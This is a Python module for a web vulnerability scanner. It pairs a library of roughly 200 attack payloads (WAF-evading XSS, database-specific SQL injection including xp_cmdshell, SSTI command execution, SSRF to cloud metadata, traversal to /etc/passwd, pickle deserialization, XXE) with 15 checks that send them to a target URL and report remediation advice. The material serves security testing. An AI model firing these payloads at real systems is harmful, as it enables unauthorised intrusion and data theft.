"""Expanded payload library (~200 payloads) + 15 new scanner checks.

Payloads sourced from PayloadsAllTheThings patterns, organized by context.
"""

from __future__ import annotations

import asyncio
import hashlib
import json
import logging
import re
import time
from typing import Any

import httpx

from models import ScanFinding

log = logging.getLogger("scanner-payloads")


# ── Payload Collections ──────────────────────────────────────────────────────

WAF_BYPASS_XSS = [
    '<img src=x onerror=alert(1)>',
    '<svg/onload=alert(1)>',
    '<body onload=alert(1)>',
    '<details open ontoggle=alert(1)>',
    '<math><mtext><table><mglyph><svg><mtext><textarea><path id="</textarea><img onerror=alert(1) src=1>">',
    '<sVg OnLoAd=alert(1)>',
    '<IMG """><SCRIPT>alert(1)</SCRIPT>">',
    '<img src=x onerror="&#x61;&#x6C;&#x65;&#x72;&#x74;(1)">',
    '"><img src=x onerror=alert(1)//',
    "'-alert(1)-'",
    '`;alert(1)//',
    '<script>alert(String.fromCharCode(88,83,83))</script>',
    '<img/src="x"/onerror=alert(1)>',
    '<svg><script>alert&#40;1&#41;</script>',
    '<input onfocus=alert(1) autofocus>',
    '<marquee onstart=alert(1)>',
    '<video src=x onerror=alert(1)>',
    '<audio src=x onerror=alert(1)>',
    '<<script>alert(1)//<</script>',
    '<iframe srcdoc="<script>alert(1)</script>">',
    '<object data="javascript:alert(1)">',
    '<a href="javascript:alert(1)">click</a>',
    '<div style="width:expression(alert(1))">',
    '${alert(1)}',
    '{{constructor.constructor("alert(1)")()}}',
    '<x contenteditable onblur=alert(1)>lose focus!</x>',
    '<svg><animate onbegin=alert(1) attributeName=x dur=1s>',
    '<a id=x tabindex=1 onfocus=alert(1)></a>',
    'jaVasCript:/*-/*`/*\\`/*\'/*"/**/(/* */oNcliCk=alert(1) )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert(1)//>\\x3e',
    '<img src=1 oNeRrOr=alert`1`>',
]

SQLI_MYSQL = [
    "' OR 1=1-- -",
    "' UNION SELECT NULL,NULL,NULL-- -",
    "' UNION SELECT @@version,NULL,NULL-- -",
    "1' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT version())))-- -",
    "1' AND UPDATEXML(1,CONCAT(0x7e,(SELECT user())),1)-- -",
    "' OR SLEEP(5)-- -",
    "' AND (SELECT * FROM (SELECT(SLEEP(5)))a)-- -",
    "1' AND 1=CONVERT(int,(SELECT @@version))-- -",
    "' GROUP BY CONCAT(version(),FLOOR(RAND(0)*2)) HAVING MIN(0)-- -",
    "admin'/*",
    "1' ORDER BY 1-- -",
    "' UNION SELECT NULL,table_name,NULL FROM information_schema.tables-- -",
]

SQLI_POSTGRES = [
    "' OR 1=1--",
    "' UNION SELECT NULL,version(),NULL--",
    "';SELECT pg_sleep(5)--",
    "' AND 1=CAST((SELECT version()) AS int)--",
    "' UNION SELECT NULL,current_database(),NULL--",
    "$$;SELECT pg_sleep(5)--$$",
    "' AND SUBSTRING(version(),1,1)='P'--",
    "' UNION SELECT NULL,string_agg(table_name,','),NULL FROM information_schema.tables--",
]

SQLI_MSSQL = [
    "' OR 1=1--",
    "' UNION SELECT NULL,@@version,NULL--",
    "'; WAITFOR DELAY '0:0:5'--",
    "' AND 1=CONVERT(int,@@version)--",
    "' UNION SELECT NULL,name,NULL FROM master..sysdatabases--",
    "'; EXEC xp_cmdshell('whoami')--",
    "' AND 1=(SELECT TOP 1 name FROM sysobjects WHERE xtype='U')--",
]

SQLI_ORACLE = [
    "' OR 1=1--",
    "' UNION SELECT NULL,banner,NULL FROM v$version WHERE ROWNUM=1--",
    "' AND 1=UTL_INADDR.GET_HOST_ADDRESS((SELECT banner FROM v$version WHERE ROWNUM=1))--",
    "' UNION SELECT NULL,table_name,NULL FROM all_tables WHERE ROWNUM<10--",
    "' AND DBMS_PIPE.RECEIVE_MESSAGE('a',5)=1--",
]

SQLI_SQLITE = [
    "' OR 1=1--",
    "' UNION SELECT NULL,sqlite_version(),NULL--",
    "' UNION SELECT NULL,sql,NULL FROM sqlite_master--",
    "' AND LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(100000000/2))))--",
    "' UNION SELECT NULL,group_concat(name),NULL FROM sqlite_master WHERE type='table'--",
]

SSTI_JINJA2 = [
    "{{7*7}}",
    "{{config}}",
    "{{self.__class__.__mro__[2].__subclasses__()}}",
    "{{''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read()}}",
    "{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}",
    "{%for x in ().__class__.__base__.__subclasses__()%}{%if 'warning' in x.__name__%}{{x()._module.__builtins__['__import__']('os').popen('id').read()}}{%endif%}{%endfor%}",
]

SSTI_TWIG = [
    "{{7*7}}",
    "{{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('id')}}",
    "{{['id']|filter('exec')}}",
    "{{app.request.server.all|join(',')}}",
]

SSTI_FREEMARKER = [
    "${7*7}",
    "<#assign ex=\"freemarker.template.utility.Execute\"?new()>${ex(\"id\")}",
    "${\"freemarker.template.utility.Execute\"?new()(\"id\")}",
]

SSTI_VELOCITY = [
    "#set($x=7*7)${x}",
    "#set($str=$class.inspect(\"java.lang.String\").type)",
    "#set($runtime=$class.inspect(\"java.lang.Runtime\").type.getRuntime())",
]

SSRF_PAYLOADS = [
    "http://127.0.0.1",
    "http://localhost",
    "http://0.0.0.0",
    "http://[::1]",
    "http://0x7f000001",             # hex IP
    "http://2130706433",             # decimal IP
    "http://017700000001",           # octal IP
    "http://127.1",                  # shorthand
    "http://0177.0.0.1",             # octal octets
    "http://0x7f.0x0.0x0.0x1",      # hex octets
    "http://127.0.0.1:80",
    "http://127.0.0.1:443",
    "http://127.0.0.1:8080",
    "http://169.254.169.254/latest/meta-data/",  # AWS metadata
    "http://metadata.google.internal/",            # GCP metadata
    "http://100.100.100.200/latest/meta-data/",    # Alibaba metadata
    "http://[0:0:0:0:0:ffff:127.0.0.1]",
    "http://localtest.me",           # DNS rebinding
    "http://spoofed.burpcollaborator.net",
    "file:///etc/passwd",
    "dict://127.0.0.1:6379/INFO",
    "gopher://127.0.0.1:6379/_INFO%0d%0a",
]

COMMAND_INJECTION_BYPASS = [
    ";id",
    "|id",
    "||id",
    "&&id",
    "`id`",
    "$(id)",
    ";{id}",
    "%0aid",           # newline
    "%0did",           # CR
    ";\nid",
    "${IFS}id",        # IFS separator
    ";i\\d",           # backslash escape
    "$({id})",
    "id%00",           # null byte
    "{{7*7}}",         # template injection crossover
    "%26%26id",        # double URL-encoded &&
    "a]%3Bid",         # bracket injection
    "';id;'",
]

PATH_TRAVERSAL_BYPASS = [
    "../../../etc/passwd",
    "....//....//....//etc/passwd",
    "..%2f..%2f..%2fetc%2fpasswd",
    "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
    "..%252f..%252f..%252fetc%252fpasswd",  # double encoding
    "..%c0%af..%c0%af..%c0%afetc%c0%afpasswd",  # unicode normalization
    "..\\..\\..\\etc\\passwd",
    "....\\....\\....\\etc\\passwd",
    "..%5c..%5c..%5cetc%5cpasswd",
    "%00../../etc/passwd",  # null byte
    "..%00/..%00/etc/passwd",
    "/..;/..;/..;/etc/passwd",
    "..\\..\\..",
    "....//",
    "..;/",
    ".%2e/",
]

POLYGLOTS = [
    "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert() )//",
    "'-var x=1;alert(1)//\\';alert(1)//\";alert(1)//\\\";<svg/onload=alert(1)>//`-alert(1)`",
    "{{7*7}}${7*7}<%= 7*7 %>${{7*7}}#{7*7}",
    "' OR ''='",
    "<script>alert(1)</script><img src=x onerror=alert(1)><svg/onload=alert(1)>",
]

DESERIALIZATION = {
    "java": [
        "rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcA",  # Java serialized HashMap prefix
        "aced0005",  # Java magic bytes (hex)
        "H4sIAAAAAAAA",  # Gzipped Java serialization
    ],
    "php": [
        'O:8:"stdClass":0:{}',
        'a:1:{i:0;s:4:"test";}',
        'O:3:"Foo":1:{s:3:"bar";s:6:"system";}',
    ],
    "python": [
        "cos\nsystem\n(S'id'\ntR.",  # pickle
        "cposix\nsystem\np0\n(S'id'\np1\ntp2\nRp3\n.",
    ],
    "dotnet": [
        "AAEAAAD/////",  # .NET BinaryFormatter prefix (base64)
    ],
}


# ── Helper: confidence assignment ────────────────────────────────────────────

def _assign_confidence(evidence_type: str) -> str:
    high_conf = {"error_message", "version_disclosure", "reflected_payload", "status_change"}
    med_conf = {"behavioral_diff", "timing_diff", "header_present"}
    if evidence_type in high_conf:
        return "confirmed"
    if evidence_type in med_conf:
        return "firm"
    return "tentative"


# ── 15 New Scanner Checks ────────────────────────────────────────────────────

async def _check_waf_bypass_xss(client: httpx.AsyncClient, url: str) -> list[ScanFinding]:
    """Context-aware XSS with WAF evasion payloads."""
    findings = []
    from urllib.parse import urlparse, parse_qs, urlencode, urlunparse

    parsed = urlparse(url)
    params = parse_qs(parsed.query, keep_blank_values=True)
    if not params:
        return findings

    # Test a subset of WAF bypass payloads
    test_payloads = WAF_BYPASS_XSS[:8]
    param_name = list(params.keys())[0]

    for payload in test_payloads:
        test_params = {**{k: v[0] if v else "" for k, v in params.items()}}
        test_params[param_name] = payload
        test_url = urlunparse(parsed._replace(query=urlencode(test_params)))

        try:
            resp = await client.get(test_url, follow_redirects=True)
            if payload in resp.text:
                findings.append(ScanFinding(
                    template_id="waf_bypass_xss",
                    name="XSS via WAF Bypass",
                    severity="high",
                    url=url,
                    matched_at=test_url,
                    description=f"WAF bypass XSS payload reflected unescaped in response via parameter '{param_name}'.",
                    extracted=[payload],
                    source="custom",
                    confidence="confirmed",
                    remediation="Implement context-aware output encoding. Do not rely solely on WAF rules.",
                ))
                break  # One confirmed is enough
        except Exception:
            continue

    return findings


async def _check_dbms_specific_sqli(client: httpx.AsyncClient, url: str) -> list[ScanFinding]:
    """DB fingerprinting + targeted injection."""
    findings = []
    from urllib.parse import urlparse, parse_qs, urlencode, urlunparse

    parsed = urlparse(url)
    params = parse_qs(parsed.query, keep_blank_values=True)
    if not params:
        return findings

    param_name = list(params.keys())[0]

    # Error-based fingerprint probes
    probes = {
        "mysql": ("' AND EXTRACTVALUE(1,CONCAT(0x7e,version()))-- -", ["XPATH syntax error", "EXTRACTVALUE"]),
        "postgres": ("' AND 1=CAST(version() AS int)--", ["invalid input syntax", "ERROR:  invalid"]),
        "mssql": ("' AND 1=CONVERT(int,@@version)--", ["Conversion failed", "converting.*varchar"]),
        "sqlite": ("' AND LIKE('A',UPPER(HEX(RANDOMBLOB(1))))--", ["LIKE", "RANDOMBLOB"]),
    }

    for db_type, (payload, indicators) in probes.items():
        test_params = {k: v[0] if v else "" for k, v in params.items()}
        test_params[param_name] = f"1{payload}"
        test_url = urlunparse(parsed._replace(query=urlencode(test_params)))

        try:
            resp = await client.get(test_url, follow_redirects=True)
            body = resp.text.lower()
            for indicator in indicators:
                if indicator.lower() in body or re.search(indicator, body, re.IGNORECASE):
                    findings.append(ScanFinding(
                        template_id=f"sqli_{db_type}_specific",
                        name=f"SQL Injection ({db_type.upper()} Detected)",
                        severity="critical",
                        url=url,
                        matched_at=test_url,
                        description=f"DB-specific SQLi error detected. Backend appears to be {db_type.upper()}.",
                        extracted=[indicator],
                        source="custom",
                        confidence="confirmed",
                        remediation="Use parameterized queries. Never concatenate user input into SQL.",
                    ))
                    return findings  # One confirmed is enough
        except Exception:
            continue

    return findings


async def _check_ssti_engine_detect(client: httpx.AsyncClient, url: str) -> list[ScanFinding]:
    """Template engine detection + exploitation probes."""
    findings = []
    from urllib.parse import urlparse, parse_qs, urlencode, urlunparse

    parsed = urlparse(url)
    params = parse_qs(parsed.query, keep_blank_values=True)
    if not params:
        return findings

    param_name = list(params.keys())[0]

    # Detection probes: payload → expected_output → engine
    probes = [
        ("{{7*7}}", "49", "jinja2/twig"),
        ("${7*7}", "49", "freemarker/velocity"),
        ("#{7*7}", "49", "ruby_erb"),
        ("<%= 7*7 %>", "49", "erb"),
        ("{{7*'7'}}", "7777777", "jinja2"),
        ("${7*7}", "49", "el/freemarker"),
    ]

    for payload, expected, engine in probes:
        test_params = {k: v[0] if v else "" for k, v in params.items()}
        test_params[param_name] = payload
        test_url = urlunparse(parsed._replace(query=urlencode(test_params)))

        try:
            resp = await client.get(test_url, follow_redirects=True)
            if expected in resp.text and payload not in resp.text:
                findings.append(ScanFinding(
                    template_id=f"ssti_{engine.replace('/', '_')}",
                    name=f"Server-Side Template Injection ({engine})",
                    severity="critical",
                    url=url,
                    matched_at=test_url,
                    description=f"SSTI confirmed. Expression '{payload}' evaluated to '{expected}'. Engine: {engine}.",
                    extracted=[f"{payload} → {expected}"],
                    source="custom",
                    confidence="confirmed",
                    remediation="Never pass user input directly into template rendering. Use sandboxed template engines.",
                ))
                return findings
        except Exception:
            continue

    return findings


async def _check_ssrf_ip_bypass(client: httpx.AsyncClient, url: str) -> list[ScanFinding]:
    """IP obfuscation for SSRF."""
    findings = []
    from urllib.parse import urlparse, parse_qs, urlencode, urlunparse

    parsed = urlparse(url)
    params = parse_qs(parsed.query, keep_blank_values=True)

    # Look for URL-like params
    url_params = [k for k, v in params.items() if v and any(
        x in v[0].lower() for x in ("http", "url", "link", "redirect", "next", "target", "dest", "uri", "path", "file")
    )]
    if not url_params:
        # Try all params with SSRF payloads
        url_params = list(params.keys())[:2]

    ssrf_probes = SSRF_PAYLOADS[:6]  # Test first 6 IP obfuscation variants

    for param_name in url_params:
        for payload in ssrf_probes:
            test_params = {k: v[0] if v else "" for k, v in params.items()}
            test_params[param_name] = payload
            test_url = urlunparse(parsed._replace(query=urlencode(test_params)))

            try:
                resp = await client.get(test_url, follow_redirects=False)
                # Check for localhost indicators in response
                localhost_indicators = ["root:", "localhost", "127.0.0.1", "apache", "nginx", "ami-id", "instance-id"]
                for indicator in localhost_indicators:
                    if indicator in resp.text.lower():
                        findings.append(ScanFinding(
                            template_id="ssrf_ip_bypass",
                            name="SSRF via IP Obfuscation",
                            severity="high",
                            url=url,
                            matched_at=test_url,
                            description=f"SSRF detected using IP bypass payload '{payload}'. Internal content leaked.",
                            extracted=[indicator, payload],
                            source="custom",
                            confidence="firm",
                            remediation="Validate URLs against allowlist. Block private IP ranges including obfuscated representations.",
                        ))
                        return findings
            except Exception:
                continue

    return findings


async def _check_command_injection_bypass(client: httpx.AsyncClient, url: str) -> list[ScanFinding]:
    """Encoding-based command injection evasion."""
    findings = []
    from urllib.parse import urlparse, parse_qs, urlencode, urlunparse

    parsed = urlparse(url)
    params = parse_qs(parsed.query, keep_blank_values=True)
    if not params:
        return findings

    param_name = list(params.keys())[0]
    probes = COMMAND_INJECTION_BYPASS[:8]
    cmd_indicators = ["uid=", "gid=", "root:", "www-data", "nobody", "daemon"]

    for payload in probes:
        test_params = {k: v[0] if v else "" for k, v in params.items()}
        test_params[param_name] = f"test{payload}"
        test_url = urlunparse(parsed._replace(query=urlencode(test_params)))

        try:
            resp = await client.get(test_url, follow_redirects=True)
            for indicator in cmd_indicators:
                if indicator in resp.text:
                    findings.append(ScanFinding(
                        template_id="command_injection_bypass",
                        name="OS Command Injection (WAF Bypass)",
                        severity="critical",
                        url=url,
                        matched_at=test_url,
                        description=f"Command injection detected using bypass payload '{payload}'.",
                        extracted=[indicator, payload],
                        source="custom",
                        confidence="confirmed",
                        remediation="Never pass user input to OS commands. Use parameterized APIs.",
                    ))
                    return findings
        except Exception:
            continue

    return findings


async def _check_path_traversal_bypass(client: httpx.AsyncClient, url: str) -> list[ScanFinding]:
    """WAF-aware path traversal with encoding tricks."""
    findings = []
    from urllib.parse import urlparse, parse_qs, urlencode, urlunparse

    parsed = urlparse(url)
    params = parse_qs(parsed.query, keep_blank_values=True)

    # Also try path-based traversal
    file_params = [k for k, v in params.items() if v and any(
        x in k.lower() for x in ("file", "path", "page", "include", "template", "doc", "folder", "dir")
    )]
    if not file_params and params:
        file_params = list(params.keys())[:1]

    if not file_params:
        return findings

    probes = PATH_TRAVERSAL_BYPASS[:8]
    indicators = ["root:x:", "[boot loader]", "\\system32\\", "[extensions]", "daemon:x:"]

    for param_name in file_params:
        for payload in probes:
            test_params = {k: v[0] if v else "" for k, v in params.items()}
            test_params[param_name] = payload
            test_url = urlunparse(parsed._replace(query=urlencode(test_params)))

            try:
                resp = await client.get(test_url, follow_redirects=True)
                for indicator in indicators:
                    if indicator in resp.text:
                        findings.append(ScanFinding(
                            template_id="path_traversal_bypass",
                            name="Path Traversal (WAF Bypass)",
                            severity="high",
                            url=url,
                            matched_at=test_url,
                            description=f"Path traversal with encoding bypass detected via '{param_name}'.",
                            extracted=[indicator, payload],
                            source="custom",
                            confidence="confirmed",
                            remediation="Canonicalize paths before use. Use chroot or allowlisted paths.",
                        ))
                        return findings
            except Exception:
                continue

    return findings


async def _check_deserialization_detect(client: httpx.AsyncClient, url: str) -> list[ScanFinding]:
    """Detect insecure deserialization by probing for gadget chain errors."""
    findings = []

    # Check for serialized data in cookies/response
    try:
        resp = await client.get(url, follow_redirects=True)

        # Check for Java serialization indicators
        if "aced0005" in resp.text or "rO0ABX" in resp.text:
            findings.append(ScanFinding(
                template_id="deserialization_java",
                name="Java Serialized Data Detected",
                severity="medium",
                url=url,
                matched_at=url,
                description="Response contains Java serialized object data. Test for insecure deserialization.",
                extracted=["Java serialization magic bytes detected"],
                source="custom",
                confidence="firm",
                remediation="Avoid Java native serialization. Use JSON or other safe formats.",
            ))

        # Check for PHP serialized data
        if re.search(r'[OaCsbi]:\d+:', resp.text):
            findings.append(ScanFinding(
                template_id="deserialization_php",
                name="PHP Serialized Data Detected",
                severity="medium",
                url=url,
                matched_at=url,
                description="Response contains PHP serialized object data. Test for object injection.",
                extracted=["PHP serialization pattern detected"],
                source="custom",
                confidence="tentative",
                remediation="Use json_encode/json_decode instead of serialize/unserialize.",
            ))

    except Exception:
        pass

    return findings


async def _check_crlf_header_injection(client: httpx.AsyncClient, url: str) -> list[ScanFinding]:
    """CRLF injection in various positions."""
    findings = []
    from urllib.parse import urlparse

    parsed = urlparse(url)
    canary = "X-CRLF-Test: injected"

    payloads = [
        f"{url}%0d%0a{canary}",
        f"{url}%0D%0A{canary}",
        f"{url}%E5%98%8A%E5%98%8D{canary}",  # Unicode CRLF
        f"{url}/%0d%0aSet-Cookie:crlf=injection",
    ]

    for payload_url in payloads:
        try:
            resp = await client.get(payload_url, follow_redirects=False)
            headers_str = "\r\n".join(f"{k}: {v}" for k, v in resp.headers.items())
            if "X-CRLF-Test" in headers_str or "crlf=injection" in headers_str:
                findings.append(ScanFinding(
                    template_id="crlf_header_injection",
                    name="CRLF Header Injection",
                    severity="medium",
                    url=url,
                    matched_at=payload_url,
                    description="Server processes CRLF sequences in URL, allowing HTTP header injection.",
                    extracted=[canary],
                    source="custom",
                    confidence="confirmed",
                    remediation="Sanitize CRLF characters from all user-controlled input used in HTTP headers.",
                ))
                return findings
        except Exception:
            continue

    return findings


async def _check_xxe_oob(client: httpx.AsyncClient, url: str) -> list[ScanFinding]:
    """XXE with external entity payload probing."""
    findings = []

    # Try XML content type
    xxe_payloads = [
        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">]><foo>&xxe;</foo>',
        '<?xml version="1.0"?><!DOCTYPE test [<!ENTITY xxe SYSTEM "http://127.0.0.1:80">]><test>&xxe;</test>',
    ]

    indicators = ["root:x:", "[extensions]", "[boot loader]", "daemon:x:"]

    for payload in xxe_payloads:
        try:
            resp = await client.post(
                url,
                content=payload,
                headers={"Content-Type": "application/xml"},
                follow_redirects=True,
            )
            for indicator in indicators:
                if indicator in resp.text:
                    findings.append(ScanFinding(
                        template_id="xxe_oob",
                        name="XML External Entity (XXE) Injection",
                        severity="critical",
                        url=url,
                        matched_at=url,
                        description="XXE injection confirmed — external entity expansion returned file contents.",
                        extracted=[indicator],
                        source="custom",
                        confidence="confirmed",
                        remediation="Disable DTD processing and external entities in XML parser configuration.",
                    ))
                    return findings
        except Exception:
            continue

    return findings


async def _check_open_redirect_bypass(client: httpx.AsyncClient, url: str) -> list[ScanFinding]:
    """Parser differential open redirect."""
    findings = []
    from urllib.parse import urlparse, parse_qs, urlencode, urlunparse

    parsed = urlparse(url)
    params = parse_qs(parsed.query, keep_blank_values=True)

    redirect_params = [k for k in params if any(
        x in k.lower() for x in ("redirect", "url", "next", "return", "goto", "target", "dest", "continue", "rurl")
    )]
    if not redirect_params:
        return findings

    bypass_payloads = [
        "//evil.com",
        "///evil.com",
        "/\\evil.com",
        "//evil.com/%2f..",
        "////evil.com",
        "https:evil.com",
        "//evil.com@legitimate.com",
        "//%0d%0aevil.com",
        "//evil%00.com",
        "https://evil.com#@legitimate.com",
    ]

    for param_name in redirect_params:
        for payload in bypass_payloads:
            test_params = {k: v[0] if v else "" for k, v in params.items()}
            test_params[param_name] = payload
            test_url = urlunparse(parsed._replace(query=urlencode(test_params)))

            try:
                resp = await client.get(test_url, follow_redirects=False)
                if resp.status_code in (301, 302, 303, 307, 308):
                    location = resp.headers.get("location", "")
                    if "evil.com" in location:
                        findings.append(ScanFinding(
                            template_id="open_redirect_bypass",
                            name="Open Redirect (Parser Bypass)",
                            severity="medium",
                            url=url,
                            matched_at=test_url,
                            description=f"Open redirect via parser differential. Payload: {payload} → Location: {location}",
                            extracted=[location, payload],
                            source="custom",
                            confidence="confirmed",
                            remediation="Use allowlisted redirect destinations. Validate full URL, not just prefix.",
                        ))
                        return findings
            except Exception:
                continue

    return findings


async def _check_nosql_injection_deep(client: httpx.AsyncClient, url: str) -> list[ScanFinding]:
    """MongoDB/CouchDB specific operator injection."""
    findings = []
    from urllib.parse import urlparse, parse_qs, urlencode, urlunparse

    parsed = urlparse(url)
    params = parse_qs(parsed.query, keep_blank_values=True)
    if not params:
        return findings

    param_name = list(params.keys())[0]

    nosql_payloads = [
        ("[$ne]=1", "operator"),
        ("[$gt]=", "operator"),
        ("[$regex]=.*", "operator"),
        ("' || '1'=='1", "string_compare"),
        ('{"$gt":""}', "json_operator"),
        ("true, $where: '1 == 1'", "where_clause"),
    ]

    baseline_resp = None
    try:
        baseline_resp = await client.get(url, follow_redirects=True)
    except Exception:
        return findings

    for payload, technique in nosql_payloads:
        test_params = {k: v[0] if v else "" for k, v in params.items()}
        test_params[f"{param_name}{payload}" if "[$" in payload else param_name] = payload
        test_url = urlunparse(parsed._replace(query=urlencode(test_params)))

        try:
            resp = await client.get(test_url, follow_redirects=True)

            # Check for behavioral differences indicating injection
            if baseline_resp and abs(len(resp.text) - len(baseline_resp.text)) > 100:
                if resp.status_code == 200 and baseline_resp.status_code == 200:
                    findings.append(ScanFinding(
                        template_id="nosql_injection_deep",
                        name=f"NoSQL Injection ({technique})",
                        severity="high",
                        url=url,
                        matched_at=test_url,
                        description=f"NoSQL injection via {technique}. Response length difference indicates operator processing.",
                        extracted=[payload, f"baseline={len(baseline_resp.text)}", f"injected={len(resp.text)}"],
                        source="custom",
                        confidence="firm",
                        remediation="Sanitize NoSQL query operators. Use parameterized queries.",
                    ))
                    return findings
        except Exception:
            continue

    return findings


async def _check_graphql_introspection(client: httpx.AsyncClient, url: str) -> list[ScanFinding]:
    """GraphQL schema extraction + injection."""
    findings = []
    from urllib.parse import urlparse

    parsed = urlparse(url)
    graphql_paths = ["/graphql", "/graphiql", "/v1/graphql", "/api/graphql", "/query"]
    base = f"{parsed.scheme}://{parsed.netloc}"

    introspection_query = json.dumps({
        "query": "{ __schema { types { name fields { name type { name } } } } }"
    })

    for path in graphql_paths:
        try:
            resp = await client.post(
                f"{base}{path}",
                content=introspection_query,
                headers={"Content-Type": "application/json"},
            )
            if resp.status_code == 200 and "__schema" in resp.text:
                findings.append(ScanFinding(
                    template_id="graphql_introspection",
                    name="GraphQL Introspection Enabled",
                    severity="medium",
                    url=f"{base}{path}",
                    matched_at=f"{base}{path}",
                    description="GraphQL introspection is enabled, exposing the full API schema.",
                    extracted=["__schema query returned data"],
                    source="custom",
                    confidence="confirmed",
                    remediation="Disable introspection in production. Use query depth/complexity limiting.",
                ))
                return findings
        except Exception:
            continue

    return findings


async def _check_race_condition_basic(client: httpx.AsyncClient, url: str) -> list[ScanFinding]:
    """Parallel request timing for race conditions."""
    findings = []

    try:
        # Send 10 concurrent requests
        tasks = [client.get(url, follow_redirects=True) for _ in range(10)]
        start = time.time()
        responses = await asyncio.gather(*tasks, return_exceptions=True)
        duration = time.time() - start

        valid_responses = [r for r in responses if isinstance(r, httpx.Response)]
        if len(valid_responses) < 5:
            return findings

        # Check for inconsistent responses (possible race condition indicator)
        status_codes = {r.status_code for r in valid_responses}
        lengths = [len(r.content) for r in valid_responses]
        length_variance = max(lengths) - min(lengths) if lengths else 0

        if len(status_codes) > 1 or length_variance > 500:
            findings.append(ScanFinding(
                template_id="race_condition_basic",
                name="Potential Race Condition",
                severity="low",
                url=url,
                matched_at=url,
                description=f"Inconsistent responses under concurrent requests. Status codes: {status_codes}. Length variance: {length_variance}.",
                extracted=[f"statuses={status_codes}", f"length_var={length_variance}", f"duration={duration:.2f}s"],
                source="custom",
                confidence="tentative",
                remediation="Implement proper locking/synchronization for state-changing operations.",
            ))

    except Exception:
        pass

    return findings


async def _check_jwt_none_alg(client: httpx.AsyncClient, url: str) -> list[ScanFinding]:
    """JWT algorithm confusion — test alg:none bypass."""
    findings = []
    import base64

    try:
        resp = await client.get(url, follow_redirects=True)

        # Search for JWTs in response headers and body
        jwt_pattern = r'eyJ[A-Za-z0-9_-]+\.eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]*'
        jwt_locations: list[tuple[str, str]] = []

        # Check Authorization header
        auth = resp.headers.get("authorization", "")
        for match in re.finditer(jwt_pattern, auth):
            jwt_locations.append(("header", match.group()))

        # Check cookies
        for cookie_header in resp.headers.get_list("set-cookie"):
            for match in re.finditer(jwt_pattern, cookie_header):
                jwt_locations.append(("cookie", match.group()))

        # Check body
        for match in re.finditer(jwt_pattern, resp.text[:10000]):
            jwt_locations.append(("body", match.group()))

        for location, jwt in jwt_locations:
            try:
                header_b64 = jwt.split(".")[0]
                # Add padding
                padding = 4 - len(header_b64) % 4
                if padding != 4:
                    header_b64 += "=" * padding
                header_json = base64.urlsafe_b64decode(header_b64)
                header = json.loads(header_json)

                alg = header.get("alg", "")
                findings.append(ScanFinding(
                    template_id="jwt_detected",
                    name=f"JWT Token Detected ({alg})",
                    severity="info",
                    url=url,
                    matched_at=url,
                    description=f"JWT token found in {location} using algorithm '{alg}'. Test for alg:none and key confusion.",
                    extracted=[f"alg={alg}", f"location={location}", jwt[:50] + "..."],
                    source="custom",
                    confidence="confirmed",
                    remediation="Enforce algorithm allowlist. Reject 'none' algorithm. Use asymmetric keys (RS256/ES256).",
                ))
            except Exception:
                continue

    except Exception:
        pass

    return findings


async def _check_prototype_pollution_deep(client: httpx.AsyncClient, url: str) -> list[ScanFinding]:
    """Deep merge + constructor overwrite prototype pollution."""
    findings = []

    pollution_payloads = [
        {"__proto__": {"polluted": "true"}},
        {"constructor": {"prototype": {"polluted": "true"}}},
        {"__proto__": {"status": 200}},
    ]

    try:
        for payload in pollution_payloads:
            resp = await client.post(
                url,
                json=payload,
                headers={"Content-Type": "application/json"},
                follow_redirects=True,
            )

            # Check if pollution affected the response
            if "polluted" in resp.text and resp.status_code == 200:
                findings.append(ScanFinding(
                    template_id="prototype_pollution_deep",
                    name="Prototype Pollution via Deep Merge",
                    severity="high",
                    url=url,
                    matched_at=url,
                    description="Server-side prototype pollution detected. __proto__ or constructor.prototype payload reflected.",
                    extracted=[json.dumps(payload)],
                    source="custom",
                    confidence="firm",
                    remediation="Sanitize __proto__ and constructor keys from user input. Use Object.create(null) for dictionaries.",
                ))
                return findings
    except Exception:
        pass

    return findings


# ── Check Registry ───────────────────────────────────────────────────────────

PAYLOAD_CHECKS: dict[str, Any] = {
    "waf_bypass_xss": _check_waf_bypass_xss,
    "dbms_specific_sqli": _check_dbms_specific_sqli,
    "ssti_engine_detect": _check_ssti_engine_detect,
    "ssrf_ip_bypass": _check_ssrf_ip_bypass,
    "command_injection_bypass": _check_command_injection_bypass,
    "path_traversal_bypass": _check_path_traversal_bypass,
    "deserialization_detect": _check_deserialization_detect,
    "crlf_header_injection": _check_crlf_header_injection,
    "xxe_oob": _check_xxe_oob,
    "open_redirect_bypass": _check_open_redirect_bypass,
    "nosql_injection_deep": _check_nosql_injection_deep,
    "graphql_introspection": _check_graphql_introspection,
    "race_condition_basic": _check_race_condition_basic,
    "jwt_none_alg": _check_jwt_none_alg,
    "prototype_pollution_deep": _check_prototype_pollution_deep,
}
